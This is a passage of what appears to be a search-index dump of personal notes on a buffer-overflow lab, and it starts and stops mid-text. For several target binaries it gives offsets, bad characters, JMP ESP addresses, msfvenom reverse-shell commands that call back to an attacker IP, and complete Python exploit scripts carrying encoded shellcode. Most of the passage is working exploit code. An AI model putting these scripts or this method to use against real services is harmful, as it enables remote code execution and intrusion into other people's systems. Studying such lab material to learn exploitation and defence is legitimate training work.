m4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co\"\n\nbadchars = (\n  \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n  \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n  \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n  \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n  \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n  \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n  \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n  \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n  \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n  \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n  \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n  \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n  \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n  \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n  \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n  \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + badchars + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-1/#jmp-point","title":"jmp point","text":"<p>run it <code>!mona jmp -r esp -cpb \"all-bad-chars\"</code></p> <p><code>!mona jmp -r esp -cpb \"\\x00\\x07\\x2e\\xa0\"</code></p> <p>copy the one with all/many false </p> <p><code>625011AF</code></p> <p>little endian</p> <p><code>\\xaf\\x11\\x50\\x62</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-1/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x07\\x2e\\xa0\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.215.21\"\nport = 1337\n\nprefix = \"OVERFLOW1 \"\noffset = 1978\noverflow = \"A\" * offset\nretn = \"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xd9\\xc9\\xba\\x51\\xf5\\x28\\xe1\\xd9\\x74\\x24\\xf4\\x58\\x2b\\xc9\\xb1\"\n\"\\x52\\x83\\xc0\\x04\\x31\\x50\\x13\\x03\\x01\\xe6\\xca\\x14\\x5d\\xe0\\x89\"\n\"\\xd7\\x9d\\xf1\\xed\\x5e\\x78\\xc0\\x2d\\x04\\x09\\x73\\x9e\\x4e\\x5f\\x78\"\n\"\\x55\\x02\\x4b\\x0b\\x1b\\x8b\\x7c\\xbc\\x96\\xed\\xb3\\x3d\\x8a\\xce\\xd2\"\n\"\\xbd\\xd1\\x02\\x34\\xff\\x19\\x57\\x35\\x38\\x47\\x9a\\x67\\x91\\x03\\x09\"\n\"\\x97\\x96\\x5e\\x92\\x1c\\xe4\\x4f\\x92\\xc1\\xbd\\x6e\\xb3\\x54\\xb5\\x28\"\n\"\\x13\\x57\\x1a\\x41\\x1a\\x4f\\x7f\\x6c\\xd4\\xe4\\x4b\\x1a\\xe7\\x2c\\x82\"\n\"\\xe3\\x44\\x11\\x2a\\x16\\x94\\x56\\x8d\\xc9\\xe3\\xae\\xed\\x74\\xf4\\x75\"\n\"\\x8f\\xa2\\x71\\x6d\\x37\\x20\\x21\\x49\\xc9\\xe5\\xb4\\x1a\\xc5\\x42\\xb2\"\n\"\\x44\\xca\\x55\\x17\\xff\\xf6\\xde\\x96\\x2f\\x7f\\xa4\\xbc\\xeb\\xdb\\x7e\"\n\"\\xdc\\xaa\\x81\\xd1\\xe1\\xac\\x69\\x8d\\x47\\xa7\\x84\\xda\\xf5\\xea\\xc0\"\n\"\\x2f\\x34\\x14\\x11\\x38\\x4f\\x67\\x23\\xe7\\xfb\\xef\\x0f\\x60\\x22\\xe8\"\n\"\\x70\\x5b\\x92\\x66\\x8f\\x64\\xe3\\xaf\\x54\\x30\\xb3\\xc7\\x7d\\x39\\x58\"\n\"\\x17\\x81\\xec\\xcf\\x47\\x2d\\x5f\\xb0\\x37\\x8d\\x0f\\x58\\x5d\\x02\\x6f\"\n\"\\x78\\x5e\\xc8\\x18\\x13\\xa5\\x9b\\x2c\\xf5\\xa1\\x8b\\x59\\xf7\\xa9\\x08\"\n\"\\xb3\\x7e\\x4f\\x24\\xd3\\xd6\\xd8\\xd1\\x4a\\x73\\x92\\x40\\x92\\xa9\\xdf\"\n\"\\x43\\x18\\x5e\\x20\\x0d\\xe9\\x2b\\x32\\xfa\\x19\\x66\\x68\\xad\\x26\\x5c\"\n\"\\x04\\x31\\xb4\\x3b\\xd4\\x3c\\xa5\\x93\\x83\\x69\\x1b\\xea\\x41\\x84\\x02\"\n\"\\x44\\x77\\x55\\xd2\\xaf\\x33\\x82\\x27\\x31\\xba\\x47\\x13\\x15\\xac\\x91\"\n\"\\x9c\\x11\\x98\\x4d\\xcb\\xcf\\x76\\x28\\xa5\\xa1\\x20\\xe2\\x1a\\x68\\xa4\"\n\"\\x73\\x51\\xab\\xb2\\x7b\\xbc\\x5d\\x5a\\xcd\\x69\\x18\\x65\\xe2\\xfd\\xac\"\n\"\\x1e\\x1e\\x9e\\x53\\xf5\\x9a\\xbe\\xb1\\xdf\\xd6\\x56\\x6c\\x8a\\x5a\\x3b\"\n\"\\x8f\\x61\\x98\\x42\\x0c\\x83\\x61\\xb1\\x0c\\xe6\\x64\\xfd\\x8a\\x1b\\x15\"\n\"\\x6e\\x7f\\x1b\\x8a\\x8f\\xaa\"\n)\n#payload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co\"\n\n\"\"\"\nbadchars = (\n  \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n  \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n  \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n  \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n  \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n  \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n  \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n  \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n  \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n  \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n  \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n  \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n  \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n  \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n  \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n  \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)\n\"\"\"\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-10/","title":"Binary 10","text":""},{"location":"Buffer%20Overflow%20Prep/binary-10/#fuzzing","title":"fuzzing","text":""},{"location":"Buffer%20Overflow%20Prep/binary-10/#offset","title":"offset","text":"<p>EIP: 41397241</p> <p>offset: 537</p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-10/#bad-chars","title":"bad chars","text":"<p>create a new fresh byte array if continuing from 9th exploit </p> <p><code>!mona bytearray -b \"\\x00\"</code></p> <p>ESP: 0188FA30</p> <p>bad chars: <code>\\x00\\xa0\\xad\\xbe\\xde\\xef</code></p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-10/#jmp-point","title":"jmp point","text":"<p>625011AF</p> <p>little endian: <code>\\xaf\\x11\\x50\\x62</code></p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-10/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\xa0\\xad\\xbe\\xde\\xef\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.171.241\"\nport = 1337\n\nprefix = \"OVERFLOW10 \"\noffset = 537\noverflow = \"A\" * offset\nretn = \"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\x2b\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\"\n\"\\x33\\xab\\xb2\\x2a\\x83\\xee\\xfc\\xe2\\xf4\\xcf\\x43\\x30\\x2a\\x33\\xab\"\n\"\\xd2\\xa3\\xd6\\x9a\\x72\\x4e\\xb8\\xfb\\x82\\xa1\\x61\\xa7\\x39\\x78\\x27\"\n\"\\x20\\xc0\\x02\\x3c\\x1c\\xf8\\x0c\\x02\\x54\\x1e\\x16\\x52\\xd7\\xb0\\x06\"\n\"\\x13\\x6a\\x7d\\x27\\x32\\x6c\\x50\\xd8\\x61\\xfc\\x39\\x78\\x23\\x20\\xf8\"\n\"\\x16\\xb8\\xe7\\xa3\\x52\\xd0\\xe3\\xb3\\xfb\\x62\\x20\\xeb\\x0a\\x32\\x78\"\n\"\\x39\\x63\\x2b\\x48\\x88\\x63\\xb8\\x9f\\x39\\x2b\\xe5\\x9a\\x4d\\x86\\xf2\"\n\"\\x64\\xbf\\x2b\\xf4\\x93\\x52\\x5f\\xc5\\xa8\\xcf\\xd2\\x08\\xd6\\x96\\x5f\"\n\"\\xd7\\xf3\\x39\\x72\\x17\\xaa\\x61\\x4c\\xb8\\xa7\\xf9\\xa1\\x6b\\xb7\\xb3\"\n\"\\xf9\\xb8\\xaf\\x39\\x2b\\xe3\\x22\\xf6\\x0e\\x17\\xf0\\xe9\\x4b\\x6a\\xf1\"\n\"\\xe3\\xd5\\xd3\\xf4\\xed\\x70\\xb8\\xb9\\x59\\xa7\\x6e\\xc3\\x81\\x18\\x33\"\n\"\\xab\\xda\\x5d\\x40\\x99\\xed\\x7e\\x5b\\xe7\\xc5\\x0c\\x34\\x54\\x67\\x92\"\n\"\\xa3\\xaa\\xb2\\x2a\\x1a\\x6f\\xe6\\x7a\\x5b\\x82\\x32\\x41\\x33\\x54\\x67\"\n\"\\x7a\\x63\\xfb\\xe2\\x6a\\x63\\xeb\\xe2\\x42\\xd9\\xa4\\x6d\\xca\\xcc\\x7e\"\n\"\\x25\\x40\\x36\\xc3\\xb8\\x3b\\x37\\x7b\\xda\\x28\\x33\\x88\\x9b\\xa3\\xd5\"\n\"\\xc1\\xa2\\x7c\\x64\\xc3\\x2b\\x8f\\x47\\xca\\x4d\\xff\\xb6\\x6b\\xc6\\x26\"\n\"\\xcc\\xe5\\xba\\x5f\\xdf\\xc3\\x42\\x9f\\x91\\xfd\\x4d\\xff\\x5b\\xc8\\xdf\"\n\"\\x4e\\x33\\x22\\x51\\x7d\\x64\\xfc\\x83\\xdc\\x59\\xb9\\xeb\\x7c\\xd1\\x56\"\n\"\\xd4\\xed\\x77\\x8f\\x8e\\x2b\\x32\\x26\\xf6\\x0e\\x23\\x6d\\xb2\\x6e\\x67\"\n\"\\xfb\\xe4\\x7c\\x65\\xed\\xe4\\x64\\x65\\xfd\\xe1\\x7c\\x5b\\xd2\\x7e\\x15\"\n\"\\xb5\\x54\\x67\\xa3\\xd3\\xe5\\xe4\\x6c\\xcc\\x9b\\xda\\x22\\xb4\\xb6\\xd2\"\n\"\\xd5\\xe6\\x10\\x52\\x37\\x19\\xa1\\xda\\x8c\\xa6\\x16\\x2f\\xd5\\xe6\\x97\"\n\"\\xb4\\x56\\x39\\x2b\\x49\\xca\\x46\\xae\\x09\\x6d\\x20\\xd9\\xdd\\x40\\x33\"\n\"\\xf8\\x4d\\xff\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-2/","title":"Binary 2","text":""},{"location":"Buffer%20Overflow%20Prep/binary-2/#fuzzing","title":"fuzzing","text":""},{"location":"Buffer%20Overflow%20Prep/binary-2/#pattern","title":"pattern","text":"<p><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700 | xclip -selection clipboard</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-2/#offset","title":"offset","text":"<p>EIP: 76413176</p> <p></p> <p>Exact match at offset 634</p> <p></p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-2/#bad-chars","title":"bad chars","text":"<p><code>!mona config -set workingfolder c:\\mona\\%p</code></p> <p><code>!mona bytearray -b \"\\x00\"</code></p> <p><code>!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 018BFA30</code></p> <p></p> <p>bad chars: <code>\\x00\\x23\\x3c\\x83\\xba</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-2/#jmp-point","title":"jmp point","text":"<p><code>!mona jmp -r esp -cpb \"\\x00\\x23\\x3c\\x83\\xba\"</code></p> <p></p> <p>625011AF</p> <p>little endian</p> <p><code>\\xaf\\x11\\x50\\x62</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-2/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x23\\x3c\\x83\\xba\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.215.21\"\nport = 1337\n\nprefix = \"OVERFLOW2 \"\noffset = 634\noverflow = \"A\" * offset\nretn = \"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xfc\\xbb\\x94\\xfa\\x8d\\xa0\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\"\n\"\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x68\\x12\\x0f\\xa0\\x90\"\n\"\\xe3\\x70\\x28\\x75\\xd2\\xb0\\x4e\\xfe\\x45\\x01\\x04\\x52\\x6a\\xea\\x48\"\n\"\\x46\\xf9\\x9e\\x44\\x69\\x4a\\x14\\xb3\\x44\\x4b\\x05\\x87\\xc7\\xcf\\x54\"\n\"\\xd4\\x27\\xf1\\x96\\x29\\x26\\x36\\xca\\xc0\\x7a\\xef\\x80\\x77\\x6a\\x84\"\n\"\\xdd\\x4b\\x01\\xd6\\xf0\\xcb\\xf6\\xaf\\xf3\\xfa\\xa9\\xa4\\xad\\xdc\\x48\"\n\"\\x68\\xc6\\x54\\x52\\x6d\\xe3\\x2f\\xe9\\x45\\x9f\\xb1\\x3b\\x94\\x60\\x1d\"\n\"\\x02\\x18\\x93\\x5f\\x43\\x9f\\x4c\\x2a\\xbd\\xe3\\xf1\\x2d\\x7a\\x99\\x2d\"\n\"\\xbb\\x98\\x39\\xa5\\x1b\\x44\\xbb\\x6a\\xfd\\x0f\\xb7\\xc7\\x89\\x57\\xd4\"\n\"\\xd6\\x5e\\xec\\xe0\\x53\\x61\\x22\\x61\\x27\\x46\\xe6\\x29\\xf3\\xe7\\xbf\"\n\"\\x97\\x52\\x17\\xdf\\x77\\x0a\\xbd\\x94\\x9a\\x5f\\xcc\\xf7\\xf2\\xac\\xfd\"\n\"\\x07\\x03\\xbb\\x76\\x74\\x31\\x64\\x2d\\x12\\x79\\xed\\xeb\\xe5\\x7e\\xc4\"\n\"\\x4c\\x79\\x81\\xe7\\xac\\x50\\x46\\xb3\\xfc\\xca\\x6f\\xbc\\x96\\x0a\\x8f\"\n\"\\x69\\x38\\x5a\\x3f\\xc2\\xf9\\x0a\\xff\\xb2\\x91\\x40\\xf0\\xed\\x82\\x6b\"\n\"\\xda\\x85\\x29\\x96\\x8d\\xa3\\xbc\\x9c\\x9d\\xdc\\xbc\\x9c\\x3e\\x34\\x48\"\n\"\\x7a\\x2a\\x56\\x1c\\xd5\\xc3\\xcf\\x05\\xad\\x72\\x0f\\x90\\xc8\\xb5\\x9b\"\n\"\\x17\\x2d\\x7b\\x6c\\x5d\\x3d\\xec\\x9c\\x28\\x1f\\xbb\\xa3\\x86\\x37\\x27\"\n\"\\x31\\x4d\\xc7\\x2e\\x2a\\xda\\x90\\x67\\x9c\\x13\\x74\\x9a\\x87\\x8d\\x6a\"\n\"\\x67\\x51\\xf5\\x2e\\xbc\\xa2\\xf8\\xaf\\x31\\x9e\\xde\\xbf\\x8f\\x1f\\x5b\"\n\"\\xeb\\x5f\\x76\\x35\\x45\\x26\\x20\\xf7\\x3f\\xf0\\x9f\\x51\\xd7\\x85\\xd3\"\n\"\\x61\\xa1\\x89\\x39\\x14\\x4d\\x3b\\x94\\x61\\x72\\xf4\\x70\\x66\\x0b\\xe8\"\n\"\\xe0\\x89\\xc6\\xa8\\x01\\x68\\xc2\\xc4\\xa9\\x35\\x87\\x64\\xb4\\xc5\\x72\"\n\"\\xaa\\xc1\\x45\\x76\\x53\\x36\\x55\\xf3\\x56\\x72\\xd1\\xe8\\x2a\\xeb\\xb4\"\n\"\\x0e\\x98\\x0c\\x9d\\x0e\\x1e\\xf3\\x1e\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-3/","title":"Binary 3","text":""},{"location":"Buffer%20Overflow%20Prep/binary-3/#fuzzing","title":"fuzzing","text":""},{"location":"Buffer%20Overflow%20Prep/binary-3/#offset","title":"offset","text":"<p>EIP: 35714234 </p> <p></p> <p>offset 1274</p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-3/#bad-chars","title":"bad chars","text":"<p>ESP: 017DFA30 <code>!mona bytearray -b \"\\x00\"</code></p> <p><code>!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 017DFA30</code></p> <p></p> <p>bad chars: <code>\\x00\\x11\\x40\\x5f\\xb8\\xee</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-3/#jmp-point","title":"jmp point","text":"<p><code>!mona jmp -r esp -cpb \"\\x00\\x11\\x40\\x5f\\xb8\\xee\"</code></p> <p></p> <p><code>62501203</code></p> <p>little endian</p> <p><code>\\x03\\x12\\x50\\x62</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-3/#exploit","title":"exploit","text":"<pre><code>import socket\n\nip = \"10.10.215.21\"\nport = 1337\n\nprefix = \"OVERFLOW3 \"\noffset = 1274\noverflow = \"A\" * offset\nretn = \"\\x03\\x12\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xfc\\xbb\\x7c\\x7a\\xfe\\x7f\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\"\n\"\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x80\\x92\\x7c\\x7f\\x78\"\n\"\\x63\\xe1\\x09\\x9d\\x52\\x21\\x6d\\xd6\\xc5\\x91\\xe5\\xba\\xe9\\x5a\\xab\"\n\"\\x2e\\x79\\x2e\\x64\\x41\\xca\\x85\\x52\\x6c\\xcb\\xb6\\xa7\\xef\\x4f\\xc5\"\n\"\\xfb\\xcf\\x6e\\x06\\x0e\\x0e\\xb6\\x7b\\xe3\\x42\\x6f\\xf7\\x56\\x72\\x04\"\n\"\\x4d\\x6b\\xf9\\x56\\x43\\xeb\\x1e\\x2e\\x62\\xda\\xb1\\x24\\x3d\\xfc\\x30\"\n\"\\xe8\\x35\\xb5\\x2a\\xed\\x70\\x0f\\xc1\\xc5\\x0f\\x8e\\x03\\x14\\xef\\x3d\"\n\"\\x6a\\x98\\x02\\x3f\\xab\\x1f\\xfd\\x4a\\xc5\\x63\\x80\\x4c\\x12\\x19\\x5e\"\n\"\\xd8\\x80\\xb9\\x15\\x7a\\x6c\\x3b\\xf9\\x1d\\xe7\\x37\\xb6\\x6a\\xaf\\x5b\"\n\"\\x49\\xbe\\xc4\\x60\\xc2\\x41\\x0a\\xe1\\x90\\x65\\x8e\\xa9\\x43\\x07\\x97\"\n\"\\x17\\x25\\x38\\xc7\\xf7\\x9a\\x9c\\x8c\\x1a\\xce\\xac\\xcf\\x72\\x23\\x9d\"\n\"\\xef\\x82\\x2b\\x96\\x9c\\xb0\\xf4\\x0c\\x0a\\xf9\\x7d\\x8b\\xcd\\xfe\\x57\"\n\"\\x6b\\x41\\x01\\x58\\x8c\\x48\\xc6\\x0c\\xdc\\xe2\\xef\\x2c\\xb7\\xf2\\x10\"\n\"\\xf9\\x18\\xa2\\xbe\\x52\\xd9\\x12\\x7f\\x03\\xb1\\x78\\x70\\x7c\\xa1\\x83\"\n\"\\x5a\\x15\\x48\\x7e\\x0d\\x10\\x9c\\x84\\x1d\\x4c\\x9c\\x84\\xbe\\xa4\\x29\"\n\"\\x62\\